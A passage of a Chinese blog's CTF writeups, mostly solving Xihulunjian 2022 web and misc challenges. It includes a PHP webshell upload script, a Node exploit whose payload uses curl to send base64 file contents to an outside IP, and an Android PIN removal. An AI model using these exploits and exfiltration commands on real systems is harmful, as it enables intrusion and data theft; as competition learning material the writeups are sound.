class="number">1</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        <span class="built_in">sum</span> += DELTA;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n-<span class="number">1</span>; p++) &#123;</span><br><span class="line">          y = vector[p+<span class="number">1</span>];</span><br><span class="line">          z = vector[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        y = vector[<span class="number">0</span>];</span><br><span class="line">        z = vector[n-<span class="number">1</span>] += MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; -<span class="number">1</span>) &#123;  </span><br><span class="line">      n = -n;</span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = rounds*DELTA;</span><br><span class="line">      y = vector[<span class="number">0</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n-<span class="number">1</span>; p&gt;<span class="number">0</span>; p--) &#123;</span><br><span class="line">          z = vector[p-<span class="number">1</span>];</span><br><span class="line">          y = vector[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = vector[n-<span class="number">1</span>];</span><br><span class="line">        y = vector[<span class="number">0</span>] -= MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((<span class="built_in">sum</span> -= DELTA) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char secret[<span class="number">17</span>] = <span class="string">&quot;welcometoycb2022&quot;</span>;</span><br><span class="line">    uint8_t buf[] = &#123;<span class="number">50</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">128</span>, <span class="number">32</span>, <span class="number">9</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">158</span>, <span class="number">160</span>, <span class="number">147</span>, <span class="number">155</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">185</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">226</span>, <span class="number">31</span>, <span class="number">171</span>, <span class="number">199</span>, <span class="number">245</span>, <span class="number">106</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    btea((uint32_t*)buf,-<span class="number">8</span>,(uint32_t*)secret);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>,buf[j]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>Pwn</tag>
        <tag>Writeup</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑2022部分Writeup及复现</title>
    <url>/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>这次西湖的题量对于人数较少的队伍来说还是蛮多的，感觉题目蛮魔幻的，做出来就感觉是非预期出的（量子态西湖）比赛ban的挺严的说，不过收获还是蛮大的，也给队伍出了不少力，累挺~~</p>
<span id="more"></span>
<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> #Web</h1>
<h2 id="扭转乾坤"><a class="markdownIt-Anchor" href="#扭转乾坤"></a> 扭转乾坤</h2>
<h3 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述：</h3>
<p>在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务</p>
<h3 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h3>
<p>这题做的很玄幻，一开始以为需要什么特殊的上传姿势，但是全都<code>403 Forbidden</code>,仔细审了一下题，考点估计就在中间件了。</p>
<p>简单试探了一下，发现</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203182455930.png" alt="扭转乾坤01"></p>
<p>发现<code>multipart/form-data</code>被ban了，有很明显的提示的意思，试着去查阅的<code>multipart/form-data</code>相关的知识点，就找到一篇这样的文章</p>
<p>在文章里发现了对于Java来说，⽀持参数名的⼤⼩写不敏感的写法。而HTTP协议中的<code>Content-Type</code>头部信息是大小写不敏感的，所以可以对<code>multipart/form-data</code>大小写bypass</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203203311993.png" alt="扭转乾坤02"></p>
<h2 id="node-magical-login"><a class="markdownIt-Anchor" href="#node-magical-login"></a> Node Magical Login</h2>
<h3 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2"></a> 题目描述：</h3>
<p>一个简单的用nodejs写的登录站点（貌似暗藏玄机）</p>
<h3 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程：</h3>
<p>这题给了源码，<strong>controller.js</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="constructor">LoginController(<span class="params">req</span>,<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const username = req.body.username</span><br><span class="line">        const password = req.body.password</span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span><span class="operator"> || </span>password !== <span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>random<span class="literal">()</span>.<span class="keyword">to</span><span class="constructor">String()</span>) &#123;</span><br><span class="line">            res.status(<span class="number">401</span>).<span class="keyword">type</span>(<span class="string">&quot;text/html&quot;</span>).send(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.cookie(<span class="string">&quot;user&quot;</span>,SECRET_COOKIE)</span><br><span class="line">            res.redirect(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (__) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以知道flag1的获取方法就是访问/flag1目录并构造一个cookie</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user=admin</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203204849857.png" alt="Node Magical Login 01"></p>
<p>flag1:  DASCTF{873803822</p>
<p>在<strong>controller.js</strong>同样知道了flag2的获取方法</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="constructor">CheckController(<span class="params">req</span>,<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.body.checkcode?req.body.checkcode:<span class="number">1234</span>;</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.length<span class="operator"> === </span><span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="keyword">to</span><span class="constructor">LowerCase()</span></span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.status(<span class="number">403</span>).json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (__) &#123;&#125;</span><br><span class="line">        res.status(<span class="number">200</span>).<span class="keyword">type</span>(<span class="string">&quot;text/html&quot;</span>).json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="keyword">to</span><span class="constructor">String()</span>.trim<span class="literal">()</span>&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.status(<span class="number">403</span>).<span class="keyword">type</span>(<span class="string">&quot;text/html&quot;</span>).json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有两个判断：一个是checkcode的长度强等于16；一个是在经过<code>toLowerCase()</code>全转换为小写之后要与</p>
<p><code>aGr5AtSp55dRacer</code>相等。</p>
<p>可以使用数组来bypass</p>
<p>构建checkcode</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;checkcode&quot;</span>:[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;G&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;5&quot;</span>,</span><br><span class="line"><span class="string">&quot;d&quot;</span>,<span class="string">&quot;R&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;r&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<strong>main.js</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这里GET类型访问/flag2输入验证码抓包后输入构造好的checkcode</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213649385.png" alt="Node Magical Login 02"></p>
<p>获取到flag2：77244565647131723193036}</p>
<p>flag：DASCTF{87380382277244565647131723193036}</p>
<hr>
<p>但是在测试中发现了一个比较简单的数组bypass，满足长度为16即可</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;checkcode&quot;:[<span class="number">1,2,3,4</span>,<span class="number">5,6,7,8</span>,<span class="number">9,10,11,12</span>,<span class="number">13,14,15,16</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213905343.png" alt="Node Magical Login 03"></p>
<p>这里应该是出题人没限制好</p>
<h2 id="unusual-php"><a class="markdownIt-Anchor" href="#unusual-php"></a> unusual php</h2>
<h3 id="解题过程-3"><a class="markdownIt-Anchor" href="#解题过程-3"></a> 解题过程：</h3>
<p>访问给的链接可以获得部分源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;read&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;version&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现能够上传还能读文件</p>
<p>我们这里读一下/var/www/html/index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=read&amp;&amp;file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203234858467.png" alt="unusual php 01"></p>
<p>发现存在乱码，应该是写了一个拓展加解密，查看phpinfo()</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204010131847.png" alt="unusual php 02"></p>
<p>注意编号：20190902</p>
<p>读取/proc/self/maps，搜索20190902</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012341032.png" alt="unusual php"></p>
<p>利用伪协议读取.so文件，并保存为.so文件</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012907656.png" alt="usunual php 04"></p>
<p>对其进行反编译，找到Rc4加密的密钥“abcsdfadfjiweur”</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013112977.png" alt="usunual php 05"></p>
<p>对一开始拿到的index.php进行解密验证一下</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013306754.png" alt="usunual php 06"></p>
<p>密钥正确</p>
<p>编写一句话木马进行加密</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013605153.png" alt="usunual php 07"></p>
<p>写一个上传脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&quot;</span></span><br><span class="line"></span><br><span class="line">data = base64.b64decode(<span class="string">&quot;473xeG4d+1FXOOiInKCA0rVEAkBL0stSocHDxQ==&quot;</span>)</span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;TWe1v3.php&#x27;</span>,data)&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">re_content = s.post(url=url,files=file)</span><br><span class="line"><span class="built_in">print</span>(re_content.text)</span><br></pre></td></tr></table></figure>
<p>蚁剑链接：</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014151419.png" alt="usunual php 08"></p>
<p>原本是需要使用chmod来提升/flag权限的，但是复现是共享端口，别人已经提完权限了，直接读取就好</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014430184.png" alt="usunual php 09"></p>
<h2 id="real_ez_node"><a class="markdownIt-Anchor" href="#real_ez_node"></a> real_ez_node</h2>
<h3 id="解题过程-4"><a class="markdownIt-Anchor" href="#解题过程-4"></a> 解题过程：</h3>
<p>审源码：</p>
<p>NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击。然后存在然后存在safeobj.expend进行原型链污染，导致命令执行，接着原型链污染打ejs。<code>constructor.prototype.outputFunctionName</code>绕过那个<code>__proto__</code></p>
<p>参考</p>
<p><a href="https://xz.aliyun.com/t/12053#toc-17%E5%92%8Chttps://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/12053#toc-17和https://xz.aliyun.com/t/2894</a></p>
<p>构建exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 168</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl 101.43.139.243:8081/`cat /f*|base64`&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span> + <span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r = requests.get(</span><br><span class="line">    <span class="string">&#x27;http://3000.endpoint-9552f7133e68401e95e14dbecd1ab348.m.ins.cloud.dasctf.com:81/curl?q=&#x27;</span> + urllib.parse.quote(</span><br><span class="line">        payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>运行exp，自己的vps开启端口监听</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204020134877.png" alt="image-20230204020134877"></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">/REFTQ<span class="number">1</span>RGezYzMzgzOTAz<span class="symbol">NjA4</span>OTQz<span class="symbol">NTkyMTQ4</span>MTIwMD<span class="name">g1</span>MjQyMjk<span class="number">1</span>fQo= <span class="comment">//base64解码就行</span></span><br><span class="line">DASCTF&#123;<span class="number">63383903608943592148120085242295</span>&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> #Misc</h1>
<h2 id="机你太美"><a class="markdownIt-Anchor" href="#机你太美"></a> 机你太美</h2>
<h3 id="解题过程-5"><a class="markdownIt-Anchor" href="#解题过程-5"></a> 解题过程：</h3>
<p>修改文件后缀后，7z解压后，夜神模拟器导入vmdk</p>
<p>删除pin值</p>
<p>参考文章：<a href="https://www.cnblogs.com/Zev_Fung/p/14192545.html">https://www.cnblogs.com/Zev_Fung/p/14192545.html</a></p>
<p>删除/data/system/locksettings.db即可</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rm <span class="regexp">/data/</span>system/locksettings.db</span><br></pre></td></tr></table></figure>
<p>重启进入，发现安装有QQ和Skred</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031119995.png" alt="image-20230204031119995"></p>
<p>打开Skred发现聊天记录</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031253040.png" alt="image-20230204031253040"></p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031314258.png" alt="image-20230204031314258"></p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031344112.png" alt="image-20230204031344112"></p>
